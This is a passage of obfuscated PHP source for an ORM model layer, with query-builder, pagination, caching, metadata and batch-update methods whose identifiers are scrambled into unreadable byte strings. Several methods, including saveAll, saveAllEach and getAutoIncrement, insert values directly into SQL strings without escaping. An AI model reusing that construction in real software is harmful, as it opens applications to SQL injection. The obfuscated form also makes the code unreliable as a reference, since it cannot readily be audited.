commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ˆãŞ‡¢¹ =& $_SERVER[ •ŒÓîÆ]; return isset($this->fields[$ˆãŞ‡¢¹[306]]) ? $this->fields[$ˆãŞ‡¢¹[306]] : $this->pk; } public function getDbFields() { $Í„Æœ¦ =& $_SERVER[ •ŒÓîÆ]; if (isset($this->options[$Í„Æœ¦[334]])) { $¨îÙ›µë = $this->db->getFields($this->options[$Í„Æœ¦[334]]); return $¨îÙ›µë ? array_keys($¨îÙ›µë) : !1; } if ($this->fields) { $¨îÙ›µë = $this->fields; unset($¨îÙ›µë[$Í„Æœ¦[305]], $¨îÙ›µë[$Í„Æœ¦[306]], $¨îÙ›µë[$Í„Æœ¦[307]], $¨îÙ›µë[$Í„Æœ¦[304]]); return $¨îÙ›µë; } return !1; } public function data($˜—¥½ÃÊ = '') { $­ ³ˆ¥Ø =& $_SERVER[ •ŒÓîÆ]; if ($­ ³ˆ¥Ø[12] === $˜—¥½ÃÊ && !empty($this->data)) { return $this->data; } if (is_object($˜—¥½ÃÊ)) { $˜—¥½ÃÊ = get_object_vars($˜—¥½ÃÊ); } elseif (is_string($˜—¥½ÃÊ)) { parse_str($˜—¥½ÃÊ, $˜—¥½ÃÊ); } elseif (!is_array($˜—¥½ÃÊ)) { think_exception(think_lang($­ ³ˆ¥Ø[326])); } $this->data = $˜—¥½ÃÊ; return $this; } public function join($İ™æŸ›°) { $˜¾Ïµ“Œ =& $_SERVER[ •ŒÓîÆ]; if (is_array($İ™æŸ›°)) { $this->options[$˜¾Ïµ“Œ[337]] = $İ™æŸ›°; } elseif (!empty($İ™æŸ›°)) { $this->options[$˜¾Ïµ“Œ[337]][] = $İ™æŸ›°; } return $this; } public function union($³ü•ŒÖ, $®Ğ¡æáå = false) { $ÀÏ¸˜ç¾ =& $_SERVER[ •ŒÓîÆ]; if (empty($³ü•ŒÖ)) { return $this; } if ($®Ğ¡æáå) { $this->options[$ÀÏ¸˜ç¾[402]][$ÀÏ¸˜ç¾[403]] = !0; } if (is_object($³ü•ŒÖ)) { $³ü•ŒÖ = get_object_vars($³ü•ŒÖ); } if (is_string($³ü•ŒÖ)) { $”§Ò™ó = $³ü•ŒÖ; } elseif (is_array($³ü•ŒÖ)) { if (isset($³ü•ŒÖ[0])) { $this->options[$ÀÏ¸˜ç¾[402]] = array_merge($this->options[$ÀÏ¸˜ç¾[402]], $³ü•ŒÖ); return $this; } else { $”§Ò™ó = $³ü•ŒÖ; } } else { think_exception(think_lang($ÀÏ¸˜ç¾[326])); } $this->options[$ÀÏ¸˜ç¾[402]][] = $”§Ò™ó; return $this; } public function cache($øû¹íÒ€ = true, $ø¡šğŒÊ = null, $–€¸Ô‚Ø = '') { $ñíë®› =& $_SERVER[ •ŒÓîÆ]; if (!1 !== $øû¹íÒ€) { $this->options[$ñíë®›[404]] = array($ñíë®›[96] => $øû¹íÒ€, $ñíë®›[394] => $ø¡šğŒÊ, $ñíë®›[33] => $–€¸Ô‚Ø); } return $this; } public function field($ƒı‚õ™, $‹Èªƒèä = false) { $Š† È¹ã =& $_SERVER[ •ŒÓîÆ]; if (!0 === $ƒı‚õ™) { $Ëô„îµ = $this->getDbFields(); $ƒı‚õ™ = $Ëô„îµ ? $Ëô„îµ : $Š† È¹ã[205]; } elseif ($‹Èªƒèä) { if (is_string($ƒı‚õ™)) { $ƒı‚õ™ = explode($Š† È¹ã[50], $ƒı‚õ™); } $Ëô„îµ = $this->getDbFields(); $ƒı‚õ™ = $Ëô„îµ ? array_diff($Ëô„îµ, $ƒı‚õ™) : $ƒı‚õ™; } $this->options[$Š† È¹ã[328]] = $ƒı‚õ™; return $this; } public function scope($û­‚± = '', $Œ¶Áçù = NULL) { $İı†€²Ò =& $_SERVER[ •ŒÓîÆ]; if ($İı†€²Ò[12] === $û­‚±) { if (isset($this->_scope[$İı†€²Ò[37]])) { $€ú‡¼’¸ = $this->_scope[$İı†€²Ò[37]]; } else { return $this; } } elseif (is_string($û­‚±)) { $ÚÈç÷®§ = explode($İı†€²Ò[50], $û­‚±); $€ú‡¼’¸ = array(); foreach ($ÚÈç÷®§ as $û£¥“®) { if (!isset($this->_scope[$û£¥“®])) { continue; } $€ú‡¼’¸ = array_merge($€ú‡¼’¸, $this->_scope[$û£¥“®]); } if (!empty($Œ¶Áçù) && is_array($Œ¶Áçù)) { $€ú‡¼’¸ = array_merge($€ú‡¼’¸, $Œ¶Áçù); } } elseif (is_array($û­‚±)) { $€ú‡¼’¸ = $û­‚±; } if (is_array($€ú‡¼’¸) && !empty($€ú‡¼’¸)) { $this->options = array_merge($this->options, array_change_key_case($€ú‡¼’¸)); } return $this; } public function where($À«İìóû, $íÅôØŒŸ = null) { $œ×ø³±™ =& $_SERVER[ •ŒÓîÆ]; if (!is_null($íÅôØŒŸ) && is_string($À«İìóû)) { if (!is_array($íÅôØŒŸ)) { $íÅôØŒŸ = func_get_args(); array_shift($íÅôØŒŸ); } $íÅôØŒŸ = array_map(array($this->db, $œ×ø³±™[398]), $íÅôØŒŸ); $À«İìóû = vsprintf($À«İìóû, $íÅôØŒŸ); } elseif (is_object($À«İìóû)) { $À«İìóû = get_object_vars($À«İìóû); } elseif (is_array($À«İìóû)) { foreach ($À«İìóû as $é—ıªô³ => $İÊº°) { if ((is_numeric($é—ıªô³) || !$é—ıªô³) && is_string($İÊº°)) { if (strpos($İÊº°, $œ×ø³±™[405]) === 0) { continue; } think_trace($œ×ø³±™[406], $œ×ø³±™[12], $œ×ø³±™[49]); die; } } } if (is_string($À«İìóû) && $œ×ø³±™[12] != $À«İìóû) { $ğÇõ©é = array(); $ğÇõ©é[$œ×ø³±™[407]] = $À«İìóû; $À«İìóû = $ğÇõ©é; } if (isset($this->options[$œ×ø³±™[330]])) { $this->options[$œ×ø³±™[330]] = array_merge($this->options[$œ×ø³±™[330]], $À«İìóû); } else { $this->options[$œ×ø³±™[330]] = $À«İìóû; } return $this; } public function limit($”Å®×¯Ä, $øë½¦ï› = null) { $¹ğÃàÓğ =& $_SERVER[ •ŒÓîÆ]; $this->options[$¹ğÃàÓğ[347]] = is_null($øë½¦ï›) ? $”Å®×¯Ä : $”Å®×¯Ä . $¹ğÃàÓğ[50] . $øë½¦ï›; return $this; } public function page($­“»ø©×, $Ì¬¿‘Á = null) { $¢óºÓ™ë =& $_SERVER[ •ŒÓîÆ]; $this->options[$¢óºÓ™ë[408]] = is_null($Ì¬¿‘Á) ? $­“»ø©× : $­“»ø©× . $¢óºÓ™ë[50] . $Ì¬¿‘Á; return $this; } public function comment($˜ˆ‡ªò“) { $this->options[$_SERVER[ •ŒÓîÆ][409]] = $˜ˆ‡ªò“; return $this; } public function setProperty($¨ŞÄª¥½, $¦…ÊñÛŸ) { if (property_exists($this, $¨ŞÄª¥½)) { $this->{$¨ŞÄª¥½} = $¦…ÊñÛŸ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\151\146\171\x54\151\155\x65", "\164\151\x6d\145", "\151\156\163\x65\162\164\x2c\165\160\x64\x61\164\x65", "\146\165\x6e\143\x74\151\x6f\x6e"), array("\x63\162\x65\141\x74\145\x54\x69\155\145", "\164\x69\155\145", "\151\x6e\x73\145\x72\x74", "\x66\x75\x6e\x63\x74\x69\x6f\156")); public function setDataAuto($Ê¢òÈŸÚ) { $this->dataAuto = $Ê¢òÈŸÚ; } public function __construct($âüˆùÇŠ = '', $¶Êè§Íò = '', $“ı¿çÖ² = '') { parent::__construct($âüˆùÇŠ, $¶Êè§Íò, $“ı¿çÖ²); } protected $tableMeta = array(); protected function _beforeInsert(&$©¶‹ã§, $‹ã¨Õ½é) { $ìôà‰ =& $_SERVER[ •ŒÓîÆ]; if (!$this->checkDataAutoHas($ìôà‰[410])) { return; } $this->dataBeforeFilter($©¶‹ã§, $ìôà‰[410]); } protected function _beforeUpdate(&$¤Ìô°“Û, $¤ªß«¥Â) { $Œù†÷ÈÍ =& $_SERVER[ •ŒÓîÆ]; if (!$this->checkDataAutoHas($Œù†÷ÈÍ[411])) { return; } $this->dataBeforeFilter($¤Ìô°“Û, $Œù†÷ÈÍ[411]); } protected function _afterSelect(&$Õ´ºû‹ù, $’ˆµãº…) { if (!is_array($Õ´ºû‹ù)) { return; } if (!$this->checkDataAutoHas($_SERVER[ •ŒÓîÆ][412])) { return; } foreach ($Õ´ºû‹ù as &$¡ËÓøíú) { $this->dataAfterFilter($¡ËÓøíú); } unset($¡ËÓøíú); } protected function _afterFind(&$Ñ«Ú¡ğ˜, $“¯åª…œ) { if (!is_array($Ñ«Ú¡ğ˜)) { return; } if (!$this->checkDataAutoHas($_SERVER[ •ŒÓîÆ][412])) { return; } $this->dataAfterFilter($Ñ«Ú¡ğ˜); } public static function textEncode($ğœ­óèñ) { if (!$ğœ­óèñ) { return $ğœ­óèñ; } $Ïñ¼™¡¨ = json_encode($ğœ­óèñ); $Ïñ¼™¡¨ = preg_replace_callback($_SERVER[ •ŒÓîÆ][413], function ($½ôˆâ¢) { return addslashes($½ôˆâ¢[0]); }, $Ïñ¼™¡¨); return json_decode($Ïñ¼™¡¨); } public static function textDecode($Ÿ“éõı‡) { $Ñ§£¯¢¹ =& $_SERVER[ •ŒÓîÆ]; $Ê ™œÃ = json_encode($Ÿ“éõı‡); $Ê ™œÃ = preg_replace_callback($Ñ§£¯¢¹[414], function ($ò¡—İ‰”) { return $_SERVER[ •ŒÓîÆ][99]; }, $Ê ™œÃ); return json_decode($Ê ™œÃ); } public function setAutoIncrement($½²ïÏ…Œ) { $¡Üöà¬­ = array($this->getPk() => $½²ïÏ…Œ); $æ”ûÄôë = $this->data($¡Üöà¬­)->add(); if ($æ”ûÄôë) { $this->delete($æ”ûÄôë); } } public function getAutoIncrement() { $Ÿâ„Õ›— = $this->getTableName(); $½öûÄ‹‰ = $this->max($this->getPk()); $¤Ş€µ = $this->query("\163\150\x6f\167\x20\x74\x61\142\154\x65\x20\163\164\x61\164\x75\163\40\x77\x68\145\162\x65\40\116\141\155\x65\75\47{$Ÿâ„Õ›—}\x27"); $êòï Õç = $¤Ş€µ[0][$_SERVER[ •ŒÓîÆ][415]]; $Áü‹Ìå– = max($½öûÄ‹‰, $êòï Õç); return $Áü‹Ìå–; } protected function _callBefore($Ñ„ÀŸòì, $åô†©Òé) { return $this->cacheCallCheck($Ñ„ÀŸòì, $åô†©Òé, !1); } protected function _callAfter($ÒæÓÃ³ò, $îëË„¾) { return $this->cacheCallCheck($ÒæÓÃ³ò, $îëË„¾, !0); } protected function cacheFunctionAlias($†Àê½Ó·) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($‡ÄŒôÙ, $—Æƒ¿ÅÃ, $İÍ¢ü = false) { $ªÊÇñ¹ı = $this->cacheFunctionAlias($—Æƒ¿ÅÃ); if (!$ªÊÇñ¹ı) { return; } foreach ($ªÊÇñ¹ı as $íÃÔÔÒé => $ô”·Å¼) { $ßĞ¥„÷Ğ = $ô”·Å¼[0]; $Ü¨”±â = explode($_SERVER[ •ŒÓîÆ][50], $ô”·Å¼[1]); if ($‡ÄŒôÙ == $íÃÔÔÒé) { return $this->cacheFunctionGet($íÃÔÔÒé, $ßĞ¥„÷Ğ); } if ($İÍ¢ü && in_array($‡ÄŒôÙ, $Ü¨”±â)) { $this->cacheFunctionClear($íÃÔÔÒé, $ßĞ¥„÷Ğ); } } } public function cacheFunctionGet($ÈÑº’¯Û, $…³ÈåÛ¼) { $…íè¬íÜ = $this->cacheKeyMake($ÈÑº’¯Û, $…³ÈåÛ¼); $ŞÜ·°¼ò = Cache::get($…íè¬íÜ); if (!is_array($ŞÜ·°¼ò)) { $ŞÜ·°¼ò = call_user_func_array(array($this, $ÈÑº’¯Û), array($…³ÈåÛ¼, !0)); Cache::set($…íè¬íÜ, $ŞÜ·°¼ò); } return $ŞÜ·°¼ò; } public function cacheFunctionClear($ñÕ–ª˜, $áöú²îá) { $É˜¨ÃÜ‘ = $áöú²îá; if (!is_array($áöú²îá)) { $É˜¨ÃÜ‘ = array($áöú²îá); } foreach ($É˜¨ÃÜ‘ as $¦Ï®‡Œ) { $ï§İÊËÙ = $this->cacheKeyMake($ñÕ–ª˜, $¦Ï®‡Œ); Cache::remove($ï§İÊËÙ); } } private function cacheKeyMake($¦ş§ğÑ, $İçûî¤ª) { $ºñğØ‚ =& $_SERVER[ •ŒÓîÆ]; return get_class($this) . $ºñğØ‚[11] . $¦ş§ğÑ . $ºñğØ‚[416] . $İçûî¤ª; } protected function selectPageReset() { $”ÆµÛÔó =& $_SERVER[ •ŒÓîÆ]; if (isset($GLOBALS[$”ÆµÛÔó[417]])) { return; } $GLOBALS[$”ÆµÛÔó[417]] = isset($GLOBALS[$”ÆµÛÔó[7]][$”ÆµÛÔó[418]]) ? $GLOBALS[$”ÆµÛÔó[7]][$”ÆµÛÔó[418]] : !1; $GLOBALS[$”ÆµÛÔó[419]] = isset($GLOBALS[$”ÆµÛÔó[7]][$”ÆµÛÔó[408]]) ? $GLOBALS[$”ÆµÛÔó[7]][$”ÆµÛÔó[408]] : !1; $GLOBALS[$”ÆµÛÔó[7]][$”ÆµÛÔó[418]] = !1; $GLOBALS[$”ÆµÛÔó[7]][$”ÆµÛÔó[408]] = !1; } protected function selectPageRestore() { $ş¤ÖôÏ¾ =& $_SERVER[ •ŒÓîÆ]; if (!isset($GLOBALS[$ş¤ÖôÏ¾[417]])) { return; } $GLOBALS[$ş¤ÖôÏ¾[7]][$ş¤ÖôÏ¾[418]] = $GLOBALS[$ş¤ÖôÏ¾[417]]; $GLOBALS[$ş¤ÖôÏ¾[7]][$ş¤ÖôÏ¾[408]] = $GLOBALS[$ş¤ÖôÏ¾[419]]; if ($GLOBALS[$ş¤ÖôÏ¾[7]][$ş¤ÖôÏ¾[418]] === !1) { unset($GLOBALS[$ş¤ÖôÏ¾[7]][$ş¤ÖôÏ¾[418]]); } if ($GLOBALS[$ş¤ÖôÏ¾[7]][$ş¤ÖôÏ¾[408]] === !1) { unset($GLOBALS[$ş¤ÖôÏ¾[7]][$ş¤ÖôÏ¾[408]]); } unset($GLOBALS[$ş¤ÖôÏ¾[417]]); unset($GLOBALS[$ş¤ÖôÏ¾[419]]); } protected function selectPage($™µõª÷à = 200, $‘¥É‡Á = 1) { $ÔãäÑ– =& $_SERVER[ •ŒÓîÆ]; global $in; $§å¶±Â’ = $this->optionsValue(); $Èø½Éú® = 50000; $™µõª÷à = isset($in[$ÔãäÑ–[418]]) && $in[$ÔãäÑ–[418]] ? $in[$ÔãäÑ–[418]] : $™µõª÷à; if ($™µõª÷à === -1) { $in[$ÔãäÑ–[418]] = !1; $Èø½Éú® = 100000000; $™µõª÷à = $Èø½Éú®; } $Á¦Ÿ±¢÷ = $§å¶±Â’; $Á¦Ÿ±¢÷[$ÔãäÑ–[420]] = array(); $™µõª÷à = intval($™µõª÷à); $™µõª÷à = $™µõª÷à <= 5 ? 5 : ($™µõª÷à >= $Èø½Éú® ? $Èø½Éú® : $™µõª÷à); $‘¥É‡Á = intval(isset($in[$ÔãäÑ–[408]]) && $in[$ÔãäÑ–[408]] ? $in[$ÔãäÑ–[408]] : $‘¥É‡Á); $‘¥É‡Á = $‘¥É‡Á <= 1 ? 1 : $‘¥É‡Á; $“Ñé« = array(); $”òĞ¢Œ¦ = 1; if ($‘¥É‡Á == 1 && $”òĞ¢Œ¦) { $this->optionsValue($§å¶±Â’); $“Ñé« = $this->page($‘¥É‡Á, $™µõª÷à)->select(); $½Ø¬Íê³ = is_array($“Ñé«) ? count($“Ñé«) : 0; if ($½Ø¬Íê³ < $™µõª÷à) { $ÄŞ˜òí¤ = 1; } else { $this->optionsValue($Á¦Ÿ±¢÷); $½Ø¬Íê³ = intval($this->count()); $ÄŞ˜òí¤ = ceil($½Ø¬Íê³ / $™µõª÷à); } } else { $this->optionsValue($Á¦Ÿ±¢÷); $½Ø¬Íê³ = intval($this->count()); $ÄŞ˜òí¤ = ceil($½Ø¬Íê³ / $™µõª÷à); $‘¥É‡Á = $‘¥É‡Á >= $ÄŞ˜òí¤ ? $ÄŞ˜òí¤ : $‘¥É‡Á; $this->optionsValue($§å¶±Â’); $“Ñé« = $this->page($‘¥É‡Á, $™µõª÷à)->select(); } if (!is_array($“Ñé«)) { $“Ñé« = array(); } if ($ÄŞ˜òí¤ == 1) { $½Ø¬Íê³ = count($“Ñé«); } $Ï½Ÿ†ˆê = array($ÔãäÑ–[421] => array($ÔãäÑ–[422] => $½Ø¬Íê³, $ÔãäÑ–[418] => $™µõª÷à, $ÔãäÑ–[408] => $‘¥É‡Á, $ÔãäÑ–[423] => $ÄŞ˜òí¤), $ÔãäÑ–[424] => $“Ñé«); return $Ï½Ÿ†ˆê; } protected function checkLength($ÔáÍú, $Ê¬‡”è¯ = 0, $‹Ğò˜Áñ = '') { $Êï™äŠ =& $_SERVER[ •ŒÓîÆ]; $Ê¬‡”è¯ = $Ê¬‡”è¯ ? $Ê¬‡”è¯ : 65536; if (!$ÔáÍú || strlen($ÔáÍú) < $Ê¬‡”è¯) { return; } $‹Ğò˜Áñ = $‹Ğò˜Áñ ? $‹Ğò˜Áñ . $Êï™äŠ[73] : $Êï™äŠ[12]; show_json($‹Ğò˜Áñ . LNG($Êï™äŠ[425]) . "\50{$Ê¬‡”è¯}\51", !1); } protected function metaSet($¯çµãöµ, $¹ôÃªá² = null, $ìÜåô™µ = null) { $¬íÙ«ˆì =& $_SERVER[ •ŒÓîÆ]; if (!$this->tableMeta || !$¯çµãöµ) { return !1; } $ëÀõàâÀ = $this->tableMeta[$¬íÙ«ˆì[426]]; $­©½ÁÅ‹ = $this->tableMeta[$¬íÙ«ˆì[427]]; $û½§²µ¶ = Model($­©½ÁÅ‹); $€œ•Õ˜³ = array($ëÀõàâÀ => $¯çµãöµ, $¬íÙ«ˆì[428] => $¹ôÃªá²); if (is_null($¹ôÃªá²)) { return $û½§²µ¶->where(array($ëÀõàâÀ => $¯çµãöµ))->delete(); } if (is_null($ìÜåô™µ) && is_string($¹ôÃªá²)) { return $û½§²µ¶->where($€œ•Õ˜³)->delete(); } $ÜúåïÑ = is_array($¹ôÃªá²) ? $¹ôÃªá² : array(); if (is_string($¹ôÃªá²)) { $ÜúåïÑ[$¹ôÃªá²] = $ìÜåô™µ; } $Ìçµè·« = array(); foreach ($ÜúåïÑ as $Ñ§òõÆ± => $÷™æ™“Ö) { if (is_null($÷™æ™“Ö) && is_string($Ñ§òõÆ±)) { $û½§²µ¶->where(array($ëÀõàâÀ => $¯çµãöµ, $¬íÙ«ˆì[428] => $Ñ§òõÆ±))->delete(); continue; } $this->checkLength($÷™æ™“Ö, !1, $­©½ÁÅ‹ . $¬íÙ«ˆì[4] . $Ñ§òõÆ±); $Ìçµè·«[] = array($ëÀõàâÀ => $¯çµãöµ, $¬íÙ«ˆì[96] => $Ñ§òõÆ±, $¬íÙ«ˆì[429] => $÷™æ™“Ö); } $ÇïÖùüÚ = $¬íÙ«ˆì[430] . $­©½ÁÅ‹; CacheLock::lock($ÇïÖùüÚ); $û½§²µ¶->where(array($ëÀõàâÀ => $¯çµãöµ))->addAll($Ìçµè·«, array(), !0); CacheLock::unlock($ÇïÖùüÚ); return !0; } public function metaGet($×—úÆÆ, $¸¥Ò¥÷ = false) { $œÔÔ„£Ş =& $_SERVER[ •ŒÓîÆ]; if (!$this->tableMeta) { return array(); } $ê’Øà¥Ù = $this->tableMeta[$œÔÔ„£Ş[426]]; $×õİòâ = Model($this->tableMeta[$œÔÔ„£Ş[427]]); if ($¸¥Ò¥÷) { $²¯ËÄş½ = array($ê’Øà¥Ù => $×—úÆÆ, $œÔÔ„£Ş[96] => $¸¥Ò¥÷); return $×õİòâ->where($²¯ËÄş½)->getField($œÔÔ„£Ş[429]); } $²¯ËÄş½ = array($ê’Øà¥Ù => $×—úÆÆ); $¤ÉêÍìĞ = $×õİòâ->field($œÔÔ„£Ş[431])->where($²¯ËÄş½)->select(); $¤ÉêÍìĞ = array_to_keyvalue($¤ÉêÍìĞ, $œÔÔ„£Ş[96], $œÔÔ„£Ş[429]); return $¤ÉêÍìĞ; } private function checkDataAutoHas($Ô§Çñ«Â) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $²¨Øüåù) { if (in_array($Ô§Çñ«Â, explode($_SERVER[ •ŒÓîÆ][50], $²¨Øüåù[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ì¤šîÏ, $Ö±ÈÑº…) { $—ŠŠ …¥ =& $_SERVER[ •ŒÓîÆ]; if (!is_array($ì¤šîÏ)) { return; } foreach ($this->dataAuto as $³õÛ½ÔÛ) { $ÌÊ¬»ÇÇ = $³õÛ½ÔÛ[0]; if (!in_array($Ö±ÈÑº…, explode($—ŠŠ …¥[50], $³õÛ½ÔÛ[2]))) { continue; } switch (trim($³õÛ½ÔÛ[3])) { case $—ŠŠ …¥[376]: case $—ŠŠ …¥[377]: $’¬ôæÖ = $³õÛ½ÔÛ[1]; $Â¡×ô„ = isset($³õÛ½ÔÛ[4]) ? (array) $³õÛ½ÔÛ[4] : array(); if ($’¬ôæÖ == $—ŠŠ …¥[196] && array_key_exists($ÌÊ¬»ÇÇ, $ì¤šîÏ)) { if (!$ì¤šîÏ[$ÌÊ¬»ÇÇ]) { unset($ì¤šîÏ[$ÌÊ¬»ÇÇ]); } break; } if (isset($ì¤šîÏ[$ÌÊ¬»ÇÇ])) { array_unshift($Â¡×ô„, $ì¤šîÏ[$ÌÊ¬»ÇÇ]); } if ($—ŠŠ …¥[376] == $³õÛ½ÔÛ[3]) { $ì¤šîÏ[$ÌÊ¬»ÇÇ] = call_user_func_array($’¬ôæÖ, $Â¡×ô„); } else { $ì¤šîÏ[$ÌÊ¬»ÇÇ] = call_user_func_array(array(&$this, $’¬ôæÖ), $Â¡×ô„); } break; case $—ŠŠ …¥[325]: if (isset($ì¤šîÏ[$ÌÊ¬»ÇÇ]) && $ì¤šîÏ[$ÌÊ¬»ÇÇ]) { $ì¤šîÏ[$ÌÊ¬»ÇÇ] = call_user_func_array(array(&$this, $³õÛ½ÔÛ[1]), array($ì¤šîÏ[$ÌÊ¬»ÇÇ])); } break; case $—ŠŠ …¥[328]: $ì¤šîÏ[$ÌÊ¬»ÇÇ] = $ì¤šîÏ[$³õÛ½ÔÛ[1]]; break; case $—ŠŠ …¥[349]: if (isset($ì¤šîÏ[$ÌÊ¬»ÇÇ]) && !is_string($ì¤šîÏ[$ÌÊ¬»ÇÇ])) { $ì¤šîÏ[$ÌÊ¬»ÇÇ] = json_encode_force($ì¤šîÏ[$ÌÊ¬»ÇÇ]); } break; case $—ŠŠ …¥[378]: if ($ì¤šîÏ[$ÌÊ¬»ÇÇ] === $—ŠŠ …¥[12]) { unset($ì¤šîÏ[$ÌÊ¬»ÇÇ]); } break; case $—ŠŠ …¥[379]: $ì¤šîÏ[$ÌÊ¬»ÇÇ] = $³õÛ½ÔÛ[1]; default: break; } } if ($Ö±ÈÑº… == $—ŠŠ …¥[410]) { $äà­ĞØ = strtolower($this->db->getDbType()); if (strpos($äà­ĞØ, $—ŠŠ …¥[13]) !== 0) { return; } $¶ºäºŸ = $this->field(!0)->fields; $Åæ¤Áğı = $¶ºäºŸ[$—ŠŠ …¥[307]]; if (isset($¶ºäºŸ[$—ŠŠ …¥[306]])) { unset($Åæ¤Áğı[$¶ºäºŸ[$—ŠŠ …¥[306]]]); } foreach ($Åæ¤Áğı as $§„©ØŞ½ => $Ö±ÈÑº…) { if (!isset($ì¤šîÏ[$§„©ØŞ½])) { $ì¤šîÏ[$§„©ØŞ½] = $—ŠŠ …¥[12]; } } } } private function dataAfterFilter(&$…³ìÑ²ô) { $¤Ëóˆú• =& $_SERVER[ •ŒÓîÆ]; foreach ($this->dataAuto as $€£‰İÆ†) { $äï«âÕ = $€£‰İÆ†[0]; if (!isset($…³ìÑ²ô[$äï«âÕ])) { continue; } if (!in_array($¤Ëóˆú•[412], explode($¤Ëóˆú•[50], $€£‰İÆ†[2]))) { continue; } switch (trim($€£‰İÆ†[3])) { case $¤Ëóˆú•[376]: case $¤Ëóˆú•[377]: $´ïèÏ‹ = isset($€£‰İÆ†[4]) ? (array) $€£‰İÆ†[4] : array(); array_unshift($´ïèÏ‹, $…³ìÑ²ô[$äï«âÕ]); if (isset($€£‰İÆ†[4]) && $€£‰İÆ†[4] == $¤Ëóˆú•[432]) { $´ïèÏ‹ = array($…³ìÑ²ô[$äï«âÕ]); } if ($¤Ëóˆú•[376] == $€£‰İÆ†[3]) { $…³ìÑ²ô[$äï«âÕ] = call_user_func_array($€£‰İÆ†[1], $´ïèÏ‹); } else { $…³ìÑ²ô[$äï«âÕ] = call_user_func_array(array(&$this, $€£‰İÆ†[1]), $´ïèÏ‹); } break; case $¤Ëóˆú•[325]: if (isset($…³ìÑ²ô[$äï«âÕ]) && $…³ìÑ²ô[$äï«âÕ]) { $…³ìÑ²ô[$äï«âÕ] = call_user_func_array(array(&$this, $€£‰İÆ†[1]), array($…³ìÑ²ô[$äï«âÕ])); } break; case $¤Ëóˆú•[328]: $…³ìÑ²ô[$äï«âÕ] = $…³ìÑ²ô[$€£‰İÆ†[1]]; break; case $¤Ëóˆú•[349]: $†ë¬ºÉÓ = $…³ìÑ²ô[$äï«âÕ]; $…³ìÑ²ô[$äï«âÕ] = json_decode($†ë¬ºÉÓ, !0); if (is_null($…³ìÑ²ô[$äï«âÕ])) { $…³ìÑ²ô[$äï«âÕ] = $†ë¬ºÉÓ; } break; case $¤Ëóˆú•[378]: if ($…³ìÑ²ô[$äï«âÕ] === $¤Ëóˆú•[12]) { unset($…³ìÑ²ô[$äï«âÕ]); } break; case $¤Ëóˆú•[379]: $…³ìÑ²ô[$äï«âÕ] = $€£‰İÆ†[1]; break; default: break; } } } public function saveAll($™Õ‘äÜÔ) { $Ïƒú¾ÕŸ =& $_SERVER[ •ŒÓîÆ]; $ñ÷²õ‹™ = $this->tablePrefix . $this->tableName; $ª´ÎÑŸ = self::SQL_WHERE_IN_CHUNK; $™Õ‘äÜÔ = is_array($™Õ‘äÜÔ) ? $™Õ‘äÜÔ : array(); $ºÈùí­ = $Ïƒú¾ÕŸ[263]; $­§´¦…Ù = 0; $õĞÉé¾á = array(); $‘¯½üÜ… = count($™Õ‘äÜÔ); for ($¢Ù—¸ = 0; $¢Ù—¸ < $‘¯½üÜ…; $¢Ù—¸++) { $½³Ú§‰ = $™Õ‘äÜÔ[$¢Ù—¸]; if (!is_array($½³Ú§‰) || count($½³Ú§‰) != 4) { continue; } $şë¸×…ç = "\125\x50\x44\x41\124\105\40\140{$ñ÷²õ‹™}\140\40\x53\105\124\40{$½³Ú§‰[2]}\x20\75\40\103\101\123\x45\40{$½³Ú§‰[0]}\40\12"; if ($­§´¦…Ù == 0) { $ºÈùí­ = $şë¸×…ç; } $õĞÉé¾á[] = $Ïƒú¾ÕŸ[120] . $½³Ú§‰[1] . $Ïƒú¾ÕŸ[120]; $­§´¦…Ù++; $ºÈùí­ .= "\x20\127\x48\x45\x4e\x20\47{$½³Ú§‰[1]}\47\40\x54\110\x45\116\40\47{$½³Ú§‰[3]}\47\x20\xa"; if ($­§´¦…Ù == $ª´ÎÑŸ || $¢Ù—¸ == $‘¯½üÜ… - 1) { $´çüÃ÷˜ = implode($Ïƒú¾ÕŸ[50], $õĞÉé¾á); $ºÈùí­ .= "\40\105\116\104\40\x20\127\110\105\122\x45\40{$½³Ú§‰[0]}\40\111\x4e\x20\50{$´çüÃ÷˜}\x29\x20"; $this->execute($ºÈùí­); $­§´¦…Ù = 0; $ºÈùí­ = $şë¸×…ç; $this->chunkEventCheck(count($õĞÉé¾á)); $õĞÉé¾á = array(); } } $this->chunkEventSet(); } public function saveAllEach($•ñÎÇ„Ù) { $Áş™ŸşÌ =& $_SERVER[ •ŒÓîÆ]; $‹Îßûï = $this->tablePrefix . $this->tableName; foreach ($•ñÎÇ„Ù as $×¥ê¦§Ş) { if (!is_array($×¥ê¦§Ş) || count($×¥ê¦§Ş) != 4) { continue; } $ƒßÓ“šı = $×¥ê¦§Ş[0] . $Áş™ŸşÌ[433] . $×¥ê¦§Ş[1] . $Áş™ŸşÌ[120]; $«˜Ôñ«Ç = $×¥ê¦§Ş[2] . $Áş™ŸşÌ[433] . $×¥ê¦§Ş[3] . $Áş™ŸşÌ[120]; $”®†’´¼ = "\x75\160\144\141\x74\x65\40{$‹Îßûï}\x20\163\145\x74\x20{$«˜Ôñ«Ç}\x20\x77\x68\x65\x72\145\x20{$ƒßÓ“šı}\73"; $this->execute($”®†’´¼); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Ôµ‹‰ê = false, $­í¨›ˆÓ = false) { $this->_chunkEvent = $Ôµ‹‰ê; $this->_chunkEventParam = $­í¨›ˆÓ; } private function chunkEventCheck($£Ç²¡Ë) { if (!$this->_chunkEvent) { return; } $±Ÿ½¾Ö = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $±Ÿ½¾Ö[$_SERVER[ •ŒÓîÆ][434]] = $£Ç²¡Ë; Hook::trigger($this->_chunkEvent, $±Ÿ½¾Ö); } public function addAll($¶ºÚÀĞ, $Ôõ÷çë = array(), $÷—€ç”Ñ = false) { $ÂÚŸ™µ¦ =& $_SERVER[ •ŒÓîÆ]; ignore_timeout(); $â’ïóîú = self::SQL_WHERE_IN_CHUNK; if 